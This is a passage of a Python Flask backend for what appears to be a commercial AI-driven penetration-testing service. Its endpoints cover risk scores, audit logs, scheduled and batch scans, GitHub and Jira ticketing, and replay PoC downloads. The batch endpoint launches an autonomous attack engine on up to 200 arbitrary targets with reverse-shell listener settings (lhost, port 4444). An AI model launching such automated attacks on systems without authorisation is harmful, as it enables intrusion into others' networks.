    label = ("CRITICAL" if raw >= 9 else "HIGH" if raw >= 7 else
             "MEDIUM" if raw >= 4 else "LOW" if raw >= 1 else "NONE")
    action_map = {
        "CRITICAL": "Immediate remediation — critical vulnerabilities confirmed",
        "HIGH":     "Address high-severity findings within 72 hours",
        "MEDIUM":   "Schedule remediation sprint within 2 weeks",
        "LOW":      "Monitor and patch on next maintenance cycle",
        "NONE":     "No open findings — continue monitoring",
    }
    _audit("risk_score_viewed", project_id)
    return jsonify({
        "risk_score":          round(raw, 1),
        "risk_label":          label,
        "breakdown":           breakdown,
        "total_findings":      len(findings),
        "open_findings":       sum(1 for f in findings if f.get("status") == "open"),
        "exploited":           sum(1 for f in findings if f.get("exploited")),
        "recommended_action":  action_map[label],
        "project_name":        project.get("name",""),
        "target":              project.get("target",""),
    })


# ═══════════════════════════════════════════════════════════════════════════
# C4 — Rate Limit status endpoint
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/rate-limit/status", methods=["GET"])
def rate_limit_status():
    """C4: Check current rate-limit usage for the caller's API key."""
    api_key = request.headers.get("X-API-Key", "anon")
    plan = _resolve_api_key_plan(api_key)
    max_req, window = _PLAN_RATE_LIMITS.get(plan, _PLAN_RATE_LIMITS["free"])
    with _rate_lock:
        entry = _rate_counters.get(api_key, {"count": 0, "window_start": time.time()})
    used = entry["count"]
    window_started = datetime.utcfromtimestamp(entry["window_start"]).isoformat()
    return jsonify({
        "plan": plan,
        "limit":   max_req,
        "used":    used,
        "remaining": max(0, max_req - used),
        "window_seconds": window,
        "window_started": window_started,
    })


# ═══════════════════════════════════════════════════════════════════════════
# C5 — Audit Log endpoint
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/audit-log", methods=["GET"])
def get_audit_log():
    """C5: Query audit log. Optional ?project_id=X&limit=N"""
    project_id = request.args.get("project_id")
    limit = min(int(request.args.get("limit", 100)), 1000)
    cols = ["id","ts","user","api_key","ip","method","path","project_id","action","details","status_code"]
    try:
        _init_audit_db()
        with sqlite3.connect(str(AUDIT_DB)) as conn:
            if project_id:
                rows = conn.execute(
                    "SELECT * FROM audit_log WHERE project_id=? ORDER BY id DESC LIMIT ?",
                    (project_id, limit),
                ).fetchall()
            else:
                rows = conn.execute(
                    "SELECT * FROM audit_log ORDER BY id DESC LIMIT ?", (limit,)
                ).fetchall()
        return jsonify([dict(zip(cols, r)) for r in rows])
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500

@app.route("/api/audit-log/export", methods=["GET"])
def export_audit_log():
    """C5: Export full audit log as CSV."""
    try:
        _init_audit_db()
        with sqlite3.connect(str(AUDIT_DB)) as conn:
            rows = conn.execute("SELECT * FROM audit_log ORDER BY id").fetchall()
        cols = ["id","ts","user","api_key","ip","method","path","project_id","action","details","status_code"]
        import io, csv as _csv
        buf = io.StringIO()
        w = _csv.writer(buf)
        w.writerow(cols)
        w.writerows(rows)
        return Response(buf.getvalue(), mimetype="text/csv",
                        headers={"Content-Disposition": "attachment;filename=audit_log.csv"})
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# S1 — Scheduled Scans (CRON-like)
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/scheduled-scans", methods=["GET"])
def list_scheduled_scans():
    _init_scheduler_db()
    cols = ["id","project_id","target","cron_expr","enabled","last_run","next_run","created_at","scan_config"]
    with sqlite3.connect(str(SCHEDULER_DB)) as conn:
        rows = conn.execute("SELECT * FROM scheduled_scans ORDER BY created_at DESC").fetchall()
    return jsonify([dict(zip(cols, r)) for r in rows])

@app.route("/api/scheduled-scans", methods=["POST"])
def create_scheduled_scan():
    _init_scheduler_db()
    data = request.json or {}
    tgt = data.get("target", "").strip()
    cron_expr = data.get("cron_expr", "every_24h").strip()
    if not tgt:
        return jsonify({"error": "target required"}), 400
    # Validate cron_expr
    if not re.match(r'^(every_\d+h|daily_\d{1,2}:\d{2}|weekly_\w+_\d{1,2}:\d{2})$', cron_expr):
        return jsonify({"error": "cron_expr must be: every_Nh | daily_HH:MM | weekly_DAY_HH:MM"}), 400
    sched_id = str(uuid.uuid4())
    now_iso = datetime.utcnow().isoformat()
    next_run = _next_cron_run(cron_expr)
    # Create project
    proj_id = data.get("project_id")
    if not proj_id:
        projects = load_projects()
        proj_id = str(uuid.uuid4())
        projects[proj_id] = {"id": proj_id, "name": f"Scheduled: {tgt}",
                             "target": tgt, "type": "auto", "created_at": now_iso, "findings": []}
        save_projects(projects)
    with sqlite3.connect(str(SCHEDULER_DB)) as conn:
        conn.execute(
            "INSERT INTO scheduled_scans(id,project_id,target,cron_expr,enabled,next_run,created_at,scan_config) "
            "VALUES(?,?,?,?,1,?,?,?)",
            (sched_id, proj_id, tgt, cron_expr, next_run, now_iso, json.dumps(data.get("scan_config", {}))),
        )
    _audit("scheduled_scan_created", proj_id, {"target": tgt, "cron": cron_expr})
    return jsonify({"id": sched_id, "project_id": proj_id, "next_run": next_run, "cron_expr": cron_expr}), 201

@app.route("/api/scheduled-scans/<sched_id>", methods=["GET", "PUT", "DELETE"])
def manage_scheduled_scan(sched_id):
    _init_scheduler_db()
    cols = ["id","project_id","target","cron_expr","enabled","last_run","next_run","created_at","scan_config"]
    if request.method == "DELETE":
        with sqlite3.connect(str(SCHEDULER_DB)) as conn:
            conn.execute("DELETE FROM scheduled_scans WHERE id=?", (sched_id,))
        _audit("scheduled_scan_deleted", None, {"sched_id": sched_id})
        return jsonify({"deleted": sched_id})
    elif request.method == "PUT":
        data = request.json or {}
        allowed = {"cron_expr","enabled","scan_config"}
        updates = {k: v for k, v in data.items() if k in allowed}
        if not updates:
            return jsonify({"error": "Nothing to update"}), 400
        if "scan_config" in updates:
            updates["scan_config"] = json.dumps(updates["scan_config"])
        if "cron_expr" in updates:
            updates["next_run"] = _next_cron_run(updates["cron_expr"])
        set_clause = ", ".join(f"{k}=?" for k in updates)
        vals = list(updates.values()) + [sched_id]
        with sqlite3.connect(str(SCHEDULER_DB)) as conn:
            conn.execute(f"UPDATE scheduled_scans SET {set_clause} WHERE id=?", vals)
        return jsonify({"updated": sched_id, "changes": list(updates.keys())})
    else:
        with sqlite3.connect(str(SCHEDULER_DB)) as conn:
            row = conn.execute("SELECT * FROM scheduled_scans WHERE id=?", (sched_id,)).fetchone()
        if not row:
            return jsonify({"error": "not found"}), 404
        return jsonify(dict(zip(cols, row)))


# ═══════════════════════════════════════════════════════════════════════════
# S2 — Multi-Target Batch Scan
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/batch-scan", methods=["POST"])
def batch_scan():
    """S2: Submit up to 50 targets, each gets its own project + autopilot engine."""
    data = request.json or {}
    raw = data.get("targets", [])
    if isinstance(raw, str):
        raw = [t.strip() for t in raw.splitlines() if t.strip()]
    raw = [t.strip() for t in raw if t.strip()]
    if not raw:
        return jsonify({"error": "No targets provided"}), 400
    api_key = request.headers.get("X-API-Key", "anon")
    plan = _resolve_api_key_plan(api_key)
    batch_limit = {"free": 3, "starter": 10, "pro": 50, "enterprise": 200}.get(plan, 3)
    if len(raw) > batch_limit:
        return jsonify({"error": f"Batch limit for plan '{plan}' is {batch_limit} targets"}), 400
    mode  = data.get("mode", "normal")
    lhost = data.get("lhost", "")
    lport = data.get("lport", "4444")
    now_iso = datetime.utcnow().isoformat()
    batch_id = str(uuid.uuid4())
    projects = load_projects()
    created = []
    for tgt in raw:
        pid = str(uuid.uuid4())
        projects[pid] = {"id": pid, "name": f"Batch[{batch_id[:8]}]: {tgt}",
                         "target": tgt, "type": "auto", "created_at": now_iso,
                         "findings": [], "batch_id": batch_id}
        created.append({"project_id": pid, "target": tgt})
    save_projects(projects)

    def _start(pid, tgt):
        eng = ClaudePentestEngine(project_id=pid, targets=[tgt],
                                  mode=mode, lhost=lhost, lport=lport)
        AUTOPILOT_ENGINES[pid] = eng  # BUG3 FIX: use single authoritative dict
        eng.start()

    import concurrent.futures as _cf_batch
    ex = _cf_batch.ThreadPoolExecutor(max_workers=min(len(created), 5), thread_name_prefix="batch")
    for cp in created:
        ex.submit(_start, cp["project_id"], cp["target"])
    ex.shutdown(wait=False)

    _audit("batch_scan_started", None, {"batch_id": batch_id, "count": len(created), "plan": plan})
    return jsonify({
        "batch_id":       batch_id,
        "targets_queued": len(created),
        "projects":       created,
        "status_urls":    [f"/api/projects/{cp['project_id']}/autopilot/status" for cp in created],
    }), 201

@app.route("/api/batch-scan/<batch_id>/status", methods=["GET"])
def batch_scan_status(batch_id):
    projects = load_projects()
    batch = {pid: p for pid, p in projects.items() if p.get("batch_id") == batch_id}
    if not batch:
        return jsonify({"error": "Batch not found"}), 404
    results = []
    for pid, p in batch.items():
        eng = _active_engines.get(pid)
        st = eng.get_status() if eng else {"status": "idle"}
        f = p.get("findings", [])
        sev = {s: sum(1 for x in f if x.get("severity")==s) for s in ("critical","high","medium","low")}
        results.append({"project_id": pid, "target": p.get("target"),
                        "engine_status": st.get("status","idle"),
                        "findings": len(f), "severity_breakdown": sev})
    done = sum(1 for r in results if r["engine_status"] in ("done","idle","stopped"))
    return jsonify({"batch_id": batch_id, "total": len(results),
                    "done": done, "running": len(results)-done, "results": results})


# ═══════════════════════════════════════════════════════════════════════════
# S3 — GitHub Issues + Jira Integration
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/projects/<project_id>/integrations/github-issues", methods=["POST"])
def create_github_issues(project_id):
    """S3: Auto-create GitHub Issues from project findings."""
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "not found"}), 404
    data = request.json or {}
    repo    = data.get("repo", "")       # "owner/repo"
    token   = data.get("token") or os.environ.get("GITHUB_TOKEN", "")
    min_sev = data.get("severity_filter", ["critical","high"])
    if not repo or not token:
        return jsonify({"error": "repo and token are required"}), 400
    findings = [f for f in project.get("findings",[])
                if f.get("severity") in min_sev and f.get("status","open")=="open"]
    import urllib.request as _urlreq
    created_issues = []
    for finding in findings[:30]:
        sev = finding.get("severity","info").upper()
        title = f"[{sev}] {finding.get('title','Security Finding')}"
        body = (
            f"## Security Finding\n\n"
            f"**Severity:** {sev}  \n"
            f"**CVE:** {finding.get('cve','N/A')}  \n"
            f"**Host:** {', '.join(finding.get('hosts',[]))}  \n"
            f"**CVSS:** {finding.get('cvss_score','N/A')}  \n\n"
            f"### Description\n{finding.get('description','')}\n\n"
            f"### Remediation\n{finding.get('remediation','See security team')}\n\n"
            f"### MITRE ATT&CK\n{', '.join(finding.get('mitre_tags',[]))}\n\n"
            f"---\n*Generated by [PentSuite Autopilot](https://github.com/javii278/pentsuite)*"
        )
        labels = ["security", f"severity:{finding.get('severity','info')}"]
        if finding.get("cve"):
            labels.append("CVE")
        payload = json.dumps({"title": title, "body": body, "labels": labels}).encode()
        req = _urlreq.Request(
            f"https://api.github.com/repos/{repo}/issues", data=payload,
            headers={"Authorization": f"token {token}", "Content-Type": "application/json"},
        )
        try:
            with _urlreq.urlopen(req, timeout=12) as resp:
                issue = json.loads(resp.read())
                created_issues.append({"finding": finding.get("title"), "url": issue.get("html_url")})
        except Exception as exc:
            created_issues.append({"finding": finding.get("title"), "error": str(exc)})
    _audit("github_issues_created", project_id, {"repo": repo, "count": len(created_issues)})
    return jsonify({"created": len(created_issues), "issues": created_issues})

@app.route("/api/projects/<project_id>/integrations/jira", methods=["POST"])
def create_jira_issues(project_id):
    """S3: Auto-create Jira tickets from project findings."""
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "not found"}), 404
    data = request.json or {}
    jira_url    = data.get("jira_url", "").rstrip("/")
    jira_token  = data.get("token") or os.environ.get("JIRA_TOKEN","")
    jira_email  = data.get("email") or os.environ.get("JIRA_EMAIL","")
    project_key = data.get("project_key","SEC")
    min_sev     = data.get("severity_filter", ["critical","high"])
    if not all([jira_url, jira_token, jira_email]):
        return jsonify({"error": "jira_url, token, and email required"}), 400
    findings = [f for f in project.get("findings",[])
                if f.get("severity") in min_sev and f.get("status","open")=="open"]
    import urllib.request as _urlreq, base64 as _b64
    auth = _b64.b64encode(f"{jira_email}:{jira_token}".encode()).decode()
    prio = {"critical":"Highest","high":"High","medium":"Medium","low":"Low","info":"Lowest"}
    created_issues = []
    for finding in findings[:30]:
        sev = finding.get("severity","info")
        desc_text = (
            f"Severity: {sev.upper()}\n\n"
            f"{finding.get('description','')}\n\n"
            f"Remediation: {finding.get('remediation','')}\n\n"
            f"Hosts: {', '.join(finding.get('hosts',[]))}\n"
            f"CVSS: {finding.get('cvss_score','N/A')}"
        )
        payload = json.dumps({
            "fields": {
                "project": {"key": project_key},
                "summary": f"[Security] {finding.get('title','')}",
                "description": {
                    "type": "doc", "version": 1,
                    "content": [{"type": "paragraph", "content": [{"type": "text", "text": desc_text}]}],
                },
                "issuetype": {"name": "Bug"},
                "priority": {"name": prio.get(sev,"Medium")},
                "labels": ["security", "pentest", f"severity-{sev}"],
            }
        }).encode()
        req = _urlreq.Request(
            f"{jira_url}/rest/api/3/issue", data=payload,
            headers={"Authorization": f"Basic {auth}", "Content-Type": "application/json"},
        )
        try:
            with _urlreq.urlopen(req, timeout=12) as resp:
                issue = json.loads(resp.read())
                key = issue.get("key","?")
                created_issues.append({"finding": finding.get("title"), "key": key,
                                       "url": f"{jira_url}/browse/{key}"})
        except Exception as exc:
            created_issues.append({"finding": finding.get("title"), "error": str(exc)})
    _audit("jira_issues_created", project_id, {"project_key": project_key, "count": len(created_issues)})
    return jsonify({"created": len(created_issues), "issues": created_issues})


# ═══════════════════════════════════════════════════════════════════════════
# S4 — Replay PoC endpoint
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/projects/<project_id>/replay-pocs", methods=["GET"])
def get_replay_pocs(project_id):
    """S4: Retrieve generated replay PoC scripts."""
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "not found"}), 404
    pocs = project.get("replay_pocs", [])
    fmt = request.args.get("format", "json")
    if not pocs:
        return jsonify({"pocs": [], "message": "No PoC scripts yet — run autopilot first"})
    if fmt == "python":
        return Response(pocs[-1].get("python_poc","# No Python PoC"), content_type="text/plain",
                        headers={"Content-Disposition": "attachment;filename=replay_poc.py"})
    if fmt in ("bash","sh","curl"):
        return Response(pocs[-1].get("bash_poc","#!/bin/bash\n# No bash PoC"), content_type="text/plain",
                        headers={"Content-Disposition": "attachment;filename=replay_poc.sh"})
    # JSON default: return metadata + latest
    return jsonify({
        "total_pocs": len(pocs),
        "latest": {
            "target":           pocs[-1].get("target"),
            "generated_at":     pocs[-1].get("generated_at"),
            "steps_captured":   pocs[-1].get("steps_captured",0),
            "python_poc_lines": len((pocs[-1].get("python_poc") or "").splitlines()),
            "bash_poc_lines":   len((pocs[-1].get("bash_poc") or "").splitlines()),
            "python_url":       f"/api/projects/{project_id}/replay-pocs?format=python",
            "bash_url":         f"/api/projects/{project_id}/replay-pocs?format=bash",
        },
        "history": [{"target": p["target"], "generated_at": p["generated_at"],
                     "steps_captured": p.get("steps_captured",0)} for p in pocs],
    })


# ═══════════════════════════════════════════════════════════════════════════
# S5 — Attack Surface Score endpoint
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/projects/<project_id>/attack-surface", methods=["GET"])
def get_attack_surface(project_id):
    """S5: Get attack surface score history and latest."""
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "not found"}), 404
    scores = project.get("attack_surface_scores", [])
    if not scores:
        return jsonify({"message": "No scores yet — run autopilot first", "scores": []})
    latest = scores[-1]
    trend = "insufficient_data"
    if len(scores) >= 2:
        trend = "improving" if scores[-1]["score"] < scores[-2]["score"] else "worsening"
    _audit("attack_surface_viewed", project_id)
    return jsonify({
        "latest":  latest,
        "trend":   trend,
        "history": [{"calculated_at": s["calculated_at"], "score": s["score"],
                     "grade": s["grade"], "target": s["target"]} for s in scores],
    })


# ═══════════════════════════════════════════════════════════════════════════
# C2 — Frontend UI: Dashboard + Orgs + Monitors + Compliance + Attack Surface
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/dashboard")
def ui_dashboard():
    """C2: Main SaaS dashboard."""
    return render_template("dashboard.html")

@app.route("/orgs")
def ui_orgs():
    """C2: Organisations management UI."""
    return render_template("orgs.html")

@app.route("/monitors")
def ui_monitors():
    """C2: Continuous monitors UI."""
    return render_template("monitors.html")

@app.route("/compliance")
def ui_compliance():
    """C2: Compliance report viewer."""
    return render_template("compliance.html")

@app.route("/attack-surface")
def ui_attack_surface():
    """C2: Attack surface + risk score UI."""
    return render_template("attack_surface.html")

@app.route("/batch")
def ui_batch():
    """C2: Multi-target batch scan UI."""
    return render_template("batch.html")

@app.route("/scheduler")
def ui_scheduler():
    """C2: Scheduled scans UI."""
    return render_template("scheduler.html")


if __name__ == "__main__":
    # Init DBs and start background threads
    _init_audit_db()
    _init_scheduler_db()
    _sched_thread = threading.Thread(target=_scheduler_tick, daemon=True, name="scheduler")
    _sched_thread.start()
    app.run(debug=True, host="0.0.0.0", port=5000, use_reloader=False, threaded=True)
